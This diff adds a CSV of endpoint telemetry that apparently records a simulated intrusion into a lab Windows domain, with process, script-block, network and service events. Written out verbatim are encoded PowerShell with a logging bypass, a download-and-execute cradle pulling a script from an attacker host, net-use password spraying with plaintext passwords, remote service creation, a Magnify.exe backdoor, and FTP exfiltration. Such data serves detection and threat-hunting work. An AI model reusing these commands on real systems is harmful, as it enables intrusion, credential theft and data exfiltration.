@@ -1,0 +1,144 @@
+timestamp,host,user,chain_id,session_id,kind,summary
+2019-05-14 22:32:15.144000+00:00,HR001,nmartha,CH-0020,SES-003,process,"rundll32.exe <- svchost.exe | C:\Windows\System32\rundll32.exe C:\Windows\System32\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding"
+2019-05-14 22:32:22.132000+00:00,HR001,nmartha,CH-0024,SES-003,process,"wscript.exe <- explorer.exe | ""C:\Windows\System32\WScript.exe"" ""C:\Users\nmartha\Downloads\autoupdate.vbs"" "
+2019-05-14 22:32:23.415000+00:00,HR001,nmartha,CH-0024,SES-003,process,"powershell.exe <- wscript.exe | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8Ac"
+2019-05-14 22:32:32.735000+00:00,HR001,nmartha,,SES-003,script_block,"PowerShell script block: 'IF($PSVersIOnTAbLe.PSVersIon.MaJOr -Ge 3){$8DAc1=[REf].ASsEMBLy.GeTTYPE(\'System.Management.Automation.Utils\').""GETFIE`lD""(\'cachedGroupPolicySettings\','"
+2019-05-14 22:32:36.244000+00:00,HR001,nmartha,CH-0024,SES-003,network,powershell.exe -> 10.0.10.106:443  [2743 connections 22:32:36-23:47:41]
+2019-05-14 22:34:11.227000+00:00,HR001,nmartha,CH-0024,SES-003,process,"route.exe <- powershell.exe | ""C:\Windows\system32\ROUTE.EXE"" print"
+2019-05-14 22:34:52.560000+00:00,HR001,nmartha,CH-0024,SES-003,process,"ipconfig.exe <- powershell.exe | ""C:\Windows\system32\ipconfig.exe"" /all"
+2019-05-14 22:35:33.888000+00:00,HR001,nmartha,CH-0024,SES-003,process,"whoami.exe <- powershell.exe | ""C:\Windows\system32\whoami.exe"" /all /fo list"
+2019-05-14 22:36:15.287000+00:00,HR001,nmartha,CH-0024,SES-003,process,"qprocess.exe <- powershell.exe | ""C:\Windows\system32\qprocess.exe"" *"
+2019-05-14 22:36:56.596000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" start"
+2019-05-14 22:36:56.647000+00:00,HR001,nmartha,CH-0024,SES-003,process,net1.exe <- net.exe | C:\Windows\system32\net1 start
+2019-05-14 22:37:50.228000+00:00,HR001,nmartha,CH-0024,SES-003,network,powershell.exe -> 172.18.39.5:389  [4 connections 22:37:50-22:37:50]
+2019-05-14 22:37:50.764000+00:00,HR001,nmartha,CH-0024,SES-003,network,powershell.exe -> 172.18.39.5:3268  [1 connections 22:37:50-22:37:50]
+2019-05-14 22:37:50.764000+00:00,HR001,nmartha,CH-0024,SES-003,network,powershell.exe -> 172.18.39.5:135  [1 connections 22:37:50-22:37:50]
+2019-05-14 22:37:50.764000+00:00,HR001,nmartha,CH-0024,SES-003,network,powershell.exe -> 172.18.39.5:49667  [1 connections 22:37:50-22:37:50]
+2019-05-14 22:41:48.711000+00:00,HR001,nmartha,CH-0024,SES-003,process,"powershell.exe <- powershell.exe | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noninteractive -Sta -encodedCommand CgAgACAAIAAgACAAIAAgACAAIAAgACAAIABBAGQAZAAtAFQAeQBwAGUAIAAtAEEAcwBzAGUAb"
+2019-05-14 22:42:04.879000+00:00,HR001,nmartha,CH-0024,SES-003,process,"netstat.exe <- powershell.exe | ""C:\Windows\system32\NETSTAT.EXE"" -ano"
+2019-05-14 22:43:10.226000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" group ""Domain Admins"" /domain"
+2019-05-14 22:43:10.278000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net1.exe <- net.exe | C:\Windows\system32\net1 group ""Domain Admins"" /domain"
+2019-05-14 22:44:11.879000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" localgroup Administrators"
+2019-05-14 22:44:11.905000+00:00,HR001,nmartha,CH-0024,SES-003,process,net1.exe <- net.exe | C:\Windows\system32\net1 localgroup Administrators
+2019-05-14 22:45:18.627000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" user"
+2019-05-14 22:45:18.650000+00:00,HR001,nmartha,CH-0024,SES-003,process,net1.exe <- net.exe | C:\Windows\system32\net1 user
+2019-05-14 22:46:15.117000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" user /domain"
+2019-05-14 22:46:15.147000+00:00,HR001,nmartha,CH-0024,SES-003,process,net1.exe <- net.exe | C:\Windows\system32\net1 user /domain
+2019-05-14 22:47:16.722000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" group ""Domain Computers"" /domain"
+2019-05-14 22:47:16.747000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net1.exe <- net.exe | C:\Windows\system32\net1 group ""Domain Computers"" /domain"
+2019-05-14 22:48:03.002000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use"
+2019-05-14 22:48:44.356000+00:00,HR001,nmartha,CH-0024,SES-003,process,"netstat.exe <- powershell.exe | ""C:\Windows\system32\NETSTAT.EXE"" -ano"
+2019-05-14 22:49:56.158000+00:00,HR001,nmartha,CH-0024,SES-003,process,"reg.exe <- powershell.exe | ""C:\Windows\system32\reg.exe"" query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA"
+2019-05-14 22:51:19.220000+00:00,HR001,nmartha,CH-0024,SES-003,process,powershell.exe <- powershell.exe | powershell.exe -w 1 -enc SQBFAFgAIAAiACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8AL
+2019-05-14 22:51:21.228000+00:00,HR001,nmartha,,SES-003,script_block,"PowerShell script block: 'IEX ""(new-object net.webclient).downloadstring(\'http://10.0.10.106:8080/update.ps1\')""|IEX'"
+2019-05-14 22:51:21.406000+00:00,HR001,nmartha,,SES-003,script_block,"PowerShell script block: ""(new-object net.webclient).downloadstring('http://10.0.10.106:8080/update.ps1')"""
+2019-05-14 22:51:21.497000+00:00,HR001,nmartha,CH-0024,SES-003,process,"powershell.exe <- powershell.exe | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBFAFIAcwBpAE8AbgAuAE0AYQBKAG8AUg"
+2019-05-14 22:51:21.813000+00:00,HR001,nmartha,,SES-003,script_block,"PowerShell script block: 'If($PSVErSIOnTABlE.PSVERsiOn.MaJoR -ge 3){$8DAc1=[rEF].ASSEmBLY.GeTTYPe(\'System.Management.Automation.Utils\').""GetFie`Ld""(\'cachedGroupPolicySettings\','"
+2019-05-14 22:51:22.740000+00:00,HR001,nmartha,CH-0024,SES-003,network,powershell.exe -> 10.0.10.106:8080  [1 connections 22:51:22-22:51:22]
+2019-05-14 22:52:15.991000+00:00,HR001,nmartha,CH-0024,SES-003,process,"whoami.exe <- powershell.exe | ""C:\Windows\system32\whoami.exe"" /groups"
+2019-05-14 22:52:19.221000+00:00,HR001,nmartha,CH-0024,SES-003,process,"powershell.exe <- powershell.exe | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAQgBMAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAE8Ac"
+2019-05-14 22:52:21.716000+00:00,HR001,nmartha,,SES-003,script_block,"PowerShell script block: 'IF($PSVeRSiONTaBLE.PSVERsIOn.MAJOr -ge 3){$8DAc1=[rEF].ASSEmBLY.GetType(\'System.Management.Automation.Utils\').""GetFIe`lD""(\'cachedGroupPolicySettings\','"
+2019-05-14 22:54:13+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\pgustavo Password123"
+2019-05-14 22:54:14.887000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\pgustavo W1n1!19"
+2019-05-14 22:54:15.029000+00:00,HR001,nmartha,,SES-003,explicit_creds,nmartha used creds of pgustavo for IT001
+2019-05-14 22:54:15.044000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use /delete \\IT001\ADMIN$"
+2019-05-14 22:54:15.122000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\pgustavo Luch0!"
+2019-05-14 22:54:16.575000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\pgustavo Hunt1ng!"
+2019-05-14 22:54:18.059000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\pgustavo P3dr0Dulc3!"
+2019-05-14 22:54:19.634000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\lrodriguez Password123"
+2019-05-14 22:54:21.264000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\lrodriguez W1n1!19"
+2019-05-14 22:54:22.855000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\lrodriguez Luch0!"
+2019-05-14 22:54:24.456000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\lrodriguez Hunt1ng!"
+2019-05-14 22:54:26.116000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\lrodriguez P3dr0Dulc3!"
+2019-05-14 22:54:27.979000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\mmidge Password123"
+2019-05-14 22:54:29.563000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\mmidge W1n1!19"
+2019-05-14 22:54:31.189000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\mmidge Luch0!"
+2019-05-14 22:54:32.742000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\mmidge Hunt1ng!"
+2019-05-14 22:54:34.447000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\IT001\ADMIN$ /user:shire\mmidge P3dr0Dulc3!"
+2019-05-14 22:54:36.058000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\pgustavo Password123"
+2019-05-14 22:54:37.747000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\pgustavo W1n1!19"
+2019-05-14 22:54:37.857000+00:00,HR001,nmartha,,SES-003,explicit_creds,nmartha used creds of pgustavo for ACCT001
+2019-05-14 22:54:37.872000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use /delete \\ACCT001\ADMIN$"
+2019-05-14 22:54:37.917000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\pgustavo Luch0!"
+2019-05-14 22:54:39.577000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\pgustavo Hunt1ng!"
+2019-05-14 22:54:41.100000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\pgustavo P3dr0Dulc3!"
+2019-05-14 22:54:42.561000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\lrodriguez Password123"
+2019-05-14 22:54:44.148000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\lrodriguez W1n1!19"
+2019-05-14 22:54:45.867000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\lrodriguez Luch0!"
+2019-05-14 22:54:47.436000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\lrodriguez Hunt1ng!"
+2019-05-14 22:54:49.141000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\lrodriguez P3dr0Dulc3!"
+2019-05-14 22:54:50.680000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\mmidge Password123"
+2019-05-14 22:54:52.246000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\mmidge W1n1!19"
+2019-05-14 22:54:53.846000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\mmidge Luch0!"
+2019-05-14 22:54:55.401000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\mmidge Hunt1ng!"
+2019-05-14 22:54:57.104000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\ACCT001\ADMIN$ /user:shire\mmidge P3dr0Dulc3!"
+2019-05-14 22:54:58.653000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\pgustavo Password123"
+2019-05-14 22:55:00.281000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\pgustavo W1n1!19"
+2019-05-14 22:55:00.362000+00:00,HR001,nmartha,,SES-003,explicit_creds,nmartha used creds of pgustavo for HFDC01
+2019-05-14 22:55:00.378000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use /delete \\HFDC01\ADMIN$"
+2019-05-14 22:55:00.430000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\pgustavo Luch0!"
+2019-05-14 22:55:01.913000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\pgustavo Hunt1ng!"
+2019-05-14 22:55:03.459000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\pgustavo P3dr0Dulc3!"
+2019-05-14 22:55:05.209000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\lrodriguez Password123"
+2019-05-14 22:55:06.843000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\lrodriguez W1n1!19"
+2019-05-14 22:55:08.309000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\lrodriguez Luch0!"
+2019-05-14 22:55:09.833000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\lrodriguez Hunt1ng!"
+2019-05-14 22:55:11.304000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\lrodriguez P3dr0Dulc3!"
+2019-05-14 22:55:12.873000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\mmidge Password123"
+2019-05-14 22:55:14.417000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\mmidge W1n1!19"
+2019-05-14 22:55:15.973000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\mmidge Luch0!"
+2019-05-14 22:55:17.521000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\mmidge Hunt1ng!"
+2019-05-14 22:55:19.231000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\mmidge P3dr0Dulc3!"
+2019-05-14 22:56:22.655000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\ADMIN$ /user:shire\pgustavo W1n1!19"
+2019-05-14 22:56:22.702000+00:00,HR001,nmartha,,SES-003,explicit_creds,nmartha used creds of pgustavo for HFDC01
+2019-05-14 22:57:08.792000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use /delete \\HFDC01\ADMIN$"
+2019-05-14 22:58:05.158000+00:00,HR001,nmartha,CH-0024,SES-003,process,"net.exe <- powershell.exe | ""C:\Windows\system32\net.exe"" use \\HFDC01\C$ /user:shire\pgustavo W1n1!19"
+2019-05-14 22:58:05.317000+00:00,HR001,nmartha,,SES-003,explicit_creds,nmartha used creds of pgustavo for HFDC01
+2019-05-14 22:58:56.634000+00:00,HR001,nmartha,CH-0024,SES-003,file_drop,powershell.exe wrote C:\Windows\System32\autoupdate.vbs
+2019-05-14 22:59:48.187000+00:00,HR001,pgustavo,CH-0024,SES-003,process,"cmd.exe <- powershell.exe | ""cmd.exe"" /c C:\windows\system32\autoupdate.vbs"
+2019-05-14 22:59:49.121000+00:00,HR001,pgustavo,CH-0024,SES-003,process,"wscript.exe <- cmd.exe | ""C:\Windows\System32\WScript.exe"" ""C:\windows\system32\autoupdate.vbs"" "
+2019-05-14 22:59:49.632000+00:00,HR001,pgustavo,CH-0024,SES-003,process,"powershell.exe <- wscript.exe | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8Ac"
+2019-05-14 22:59:50.423000+00:00,HR001,pgustavo,,SES-003,script_block,"PowerShell script block: 'IF($PSVersIOnTAbLe.PSVersIon.MaJOr -Ge 3){$8DAc1=[REf].ASsEMBLy.GeTTYPE(\'System.Management.Automation.Utils\').""GETFIE`lD""(\'cachedGroupPolicySettings\','"
+2019-05-14 23:12:24.489000+00:00,HR001,pgustavo,CH-0024,SES-004,process,"sc.exe <- powershell.exe | ""C:\Windows\system32\sc.exe"" \\HFDC01 query"
+2019-05-14 23:12:25.808000+00:00,HR001,pgustavo,CH-0024,SES-004,network,sc.exe -> 172.18.39.5:135  [4 connections 23:12:25-23:16:11]
+2019-05-14 23:12:25.808000+00:00,HR001,pgustavo,CH-0024,SES-004,network,sc.exe -> 172.18.39.5:53285  [4 connections 23:12:25-23:16:11]
+2019-05-14 23:13:31.295000+00:00,HR001,pgustavo,CH-0024,SES-004,process,"sc.exe <- powershell.exe | ""C:\WINDOWS\system32\sc.exe"" \\HFDC01 create AdobeUpdater binPath= ""cmd.exe /c \""C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs\"" "" DisplayName= ""Ado"
+2019-05-14 23:13:31.343000+00:00,HFDC01,,,SES-001,service_install,"service 'Adobe Flash Updater' -> cmd.exe /c ""C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs"" "
+2019-05-14 23:13:31.356000+00:00,HFDC01,pgustavo,,SES-001,service_install,"service 'AdobeUpdater' -> cmd.exe /c ""C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs"" "
+2019-05-14 23:14:27.579000+00:00,HR001,pgustavo,CH-0024,SES-004,process,"sc.exe <- powershell.exe | ""C:\Windows\system32\sc.exe"" \\HFDC01 qc AdobeUpdater"
+2019-05-14 23:16:09.836000+00:00,HR001,pgustavo,CH-0024,SES-004,process,"sc.exe <- powershell.exe | ""C:\Windows\system32\sc.exe"" \\HFDC01 start AdobeUpdater"
+2019-05-14 23:16:09.942000+00:00,HFDC01,system,CH-0119,SES-001,process,"cmd.exe <- services.exe | cmd.exe /c ""C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs"" "
+2019-05-14 23:16:10.316000+00:00,HFDC01,system,CH-0119,SES-001,process,"wscript.exe <- cmd.exe | ""C:\Windows\System32\WScript.exe"" ""C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs""  "
+2019-05-14 23:16:10.695000+00:00,HFDC01,system,CH-0119,SES-001,process,"powershell.exe <- wscript.exe | ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8Ac"
+2019-05-14 23:16:11.303000+00:00,HFDC01,system,CH-0119,SES-001,file_drop,powershell.exe wrote C:\Windows\Temp\ccbhp4gt.2w1.ps1
+2019-05-14 23:16:13.483000+00:00,HFDC01,system,CH-0119,SES-001,network,powershell.exe -> 10.0.10.106:443  [378 connections 23:16:13-23:47:41]
+2019-05-14 23:17:50.638000+00:00,HFDC01,system,CH-0119,SES-001,process,"reg.exe <- powershell.exe | ""C:\Windows\system32\reg.exe"" query ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"""
+2019-05-14 23:19:02.202000+00:00,HFDC01,system,CH-0119,SES-001,process,"takeown.exe <- powershell.exe | ""C:\Windows\system32\takeown.exe"" /F C:\Windows\system32\magnify.exe"
+2019-05-14 23:19:58.328000+00:00,HFDC01,system,CH-0119,SES-001,process,"icacls.exe <- powershell.exe | ""C:\windows\system32\icacls.exe"" C:\windows\system32\magnigy.exe /grant SYSTEM:F"
+2019-05-14 23:21:30.097000+00:00,HFDC01,system,CH-0119,SES-001,process,"icacls.exe <- powershell.exe | ""C:\windows\system32\icacls.exe"" C:\windows\system32\magnify.exe /grant SYSTEM:F"
+2019-05-14 23:29:48.857000+00:00,HFDC01,system,CH-0119,SES-001,file_drop,powershell.exe wrote C:\Windows\System32\Magnify.exe
+2019-05-14 23:31:10.473000+00:00,HFDC01,system,CH-0119,SES-001,file_drop,powershell.exe wrote C:\Windows\System32\Magnify.exe
+2019-05-14 23:34:30.648000+00:00,HR001,nmartha,CH-0024,SES-005,file_drop,powershell.exe wrote C:\Windows\System32\recycler.exe
+2019-05-14 23:35:37.079000+00:00,HR001,nmartha,CH-0024,SES-005,process,"recycler.exe <- powershell.exe | ""C:\Windows\system32\recycler.exe"" a -t7z C:\$Recycle.Bin\old.7z C:\$Recycle.Bin\recipe.txt"
+2019-05-14 23:37:55.887000+00:00,HR001,nmartha,CH-0024,SES-005,file_drop,powershell.exe wrote C:\Windows\System32\ftp.txt
+2019-05-14 23:37:55.957000+00:00,HR001,nmartha,CH-0024,SES-005,process,"ftp.exe <- powershell.exe | ""C:\Windows\System32\ftp.exe"" -v -s:ftp.txt"
+2019-05-14 23:37:56.993000+00:00,HR001,nmartha,CH-0024,SES-005,network,ftp.exe -> 10.0.10.106:21  [1 connections 23:37:56-23:37:56]
+2019-05-14 23:43:02.743000+00:00,HR001,nmartha,,SES-005,explicit_creds,nmartha used creds of pgustavo for HFDC01.shire.com
+2019-05-14 23:43:02.746000+00:00,HFDC01,pgustavo,,SES-002,remote_logon,logon type 3 (NTLM) from 172.18.39.106 as pgustavo
+2019-05-14 23:43:04.754000+00:00,HR001,nmartha,,SES-005,explicit_creds,nmartha used creds of pgustavo for HFDC01.shire.com
+2019-05-14 23:43:04.757000+00:00,HFDC01,pgustavo,,SES-002,remote_logon,logon type 3 (NTLM) from 172.18.39.106 as pgustavo
+2019-05-14 23:43:10.067000+00:00,HFDC01,pgustavo,,SES-002,remote_logon,logon type 10 (Negotiate) from 172.18.39.106 as pgustavo
+2019-05-14 23:43:10.067000+00:00,HFDC01,pgustavo,,SES-002,remote_logon,logon type 10 (Negotiate) from 172.18.39.106 as pgustavo
+2019-05-14 23:43:13.737000+00:00,HFDC01,hfdc01$,,SES-002,service_install,service 'CDPUserSvc_10e0b768' -> C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+2019-05-14 23:43:13.738000+00:00,HFDC01,hfdc01$,,SES-002,service_install,service 'PimIndexMaintenanceSvc_10e0b768' -> C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+2019-05-14 23:43:13.738000+00:00,HFDC01,hfdc01$,,SES-002,service_install,service 'OneSyncSvc_10e0b768' -> C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+2019-05-14 23:43:13.739000+00:00,HFDC01,hfdc01$,,SES-002,service_install,service 'UnistoreSvc_10e0b768' -> C:\Windows\System32\svchost.exe -k UnistackSvcGroup
+2019-05-14 23:43:13.740000+00:00,HFDC01,hfdc01$,,SES-002,service_install,service 'UserDataSvc_10e0b768' -> C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+2019-05-14 23:43:13.741000+00:00,HFDC01,hfdc01$,,SES-002,service_install,service 'WpnUserService_10e0b768' -> C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+2019-05-14 23:43:22.503000+00:00,HFDC01,,,SES-002,file_drop,spoolsv.exe wrote C:\Windows\System32\spool\drivers\x64\3\New\tsprint.dll
+2019-05-14 23:43:55.745000+00:00,HFDC01,,,SES-002,file_drop,spoolsv.exe wrote C:\Windows\System32\spool\drivers\x64\3\New\FXSWZRD.DLL
+2019-05-14 23:43:55.745000+00:00,HFDC01,,,SES-002,file_drop,spoolsv.exe wrote C:\Windows\System32\spool\drivers\x64\3\New\FXSUI.DLL
+2019-05-14 23:43:55.745000+00:00,HFDC01,,,SES-002,file_drop,spoolsv.exe wrote C:\Windows\System32\spool\drivers\x64\3\New\FXSDRV.DLL
+2019-05-14 23:43:55.745000+00:00,HFDC01,,,SES-002,file_drop,spoolsv.exe wrote C:\Windows\System32\spool\drivers\x64\3\New\FXSTIFF.DLL
+2019-05-14 23:43:55.763000+00:00,HFDC01,,,SES-002,file_drop,spoolsv.exe wrote C:\Windows\System32\spool\drivers\x64\3\New\FXSRES.DLL
+2019-05-14 23:43:59.575000+00:00,HFDC01,,,SES-002,file_drop,spoolsv.exe wrote C:\Windows\System32\spool\drivers\x64\3\New\FXSAPI.DLL
